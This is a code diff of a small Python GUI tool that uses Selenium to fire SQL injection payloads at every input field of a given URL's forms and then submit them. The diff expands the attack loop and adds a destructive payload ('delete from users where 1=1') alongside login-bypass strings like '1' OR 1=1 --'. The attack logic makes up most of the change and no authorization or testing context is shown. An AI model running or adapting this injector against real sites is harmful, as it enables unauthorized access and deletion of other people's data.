@@ -4,8 +4,10 @@ import time
 import tkinter as tk
 from tkinter import filedialog
 from selenium import webdriver
+from seleniumrequests import Chrome
 from selenium.webdriver.common.keys import Keys
 
+# UI helper functions
 def browse_func():
     filename = filedialog.askopenfilename()
 
@@ -16,6 +18,42 @@ def button_click(event):
 
     else:
         runAttacks(url)
+
+def runAttacks(url):
+    INJECTION_QUERIES = ["1' OR 1=1 --", "%' or 1=1 --", "s'; delete from users where 1=1; --"]
+
+    driver = Chrome()
+    #print(driver.request('POST', url))
+    driver.get(url)
+    time.sleep(2)
+    form1 = driver.find_element_by_name('txtField')
+    form2 = driver.find_element_by_name('passField')
+    forms = driver.find_elements_by_tag_name('input')
+
+    for form in forms:
+        # continue trying until we run out of queries
+        for query in INJECTION_QUERIES:
+            print("QUERY START " + query)
+            forms = driver.find_elements_by_tag_name('input')
+            # we need to input our injections without knowing what inputs require other inputs to submit
+            # so loop through every form element not being injected to and fill it with sample data
+            for otherForm in forms:
+                otherForm.send_keys(query)
+                time.sleep(1)
+            # returns true if http status code is less than 400
+            if not driver.request('POST', url).ok:
+                print("500!")
+                print(query)
+                time.sleep(5)
+                #driver.close()
+                #driver = Chrome()
+                #.get(url)
+                driver.get(url)
+                time.sleep(2)
+                break
+            form.submit()
+            time.sleep(3)
+    driver.quit()
 
 # setup UI
 window = tk.Tk()
@@ -32,21 +70,3 @@ URLentry.pack()
 browseButton.pack()
 startButton.pack()
 tk.mainloop()
-
-def runAttacks(url):
-    INJECTION_QUERIES = ["1' OR 1=1 --", "%' or 1=1 --"]
-
-    driver = webdriver.Chrome('chromedriver.exe')
-    driver.get(url)
-    time.sleep(2)
-    form1 = driver.find_element_by_name('txtField')
-    form2 = driver.find_element_by_name('passField')
-
-    #continue trying until we run out of queries
-    for query in INJECTION_QUERIES:
-        #we need to input our injections without knowing what inputs require other inputs to submit
-        #so loop through every form element not being injected to and fill it with sample data
-        form2.send_keys(query)
-        form2.submit()
-        time.sleep(5)
-    driver.quit()
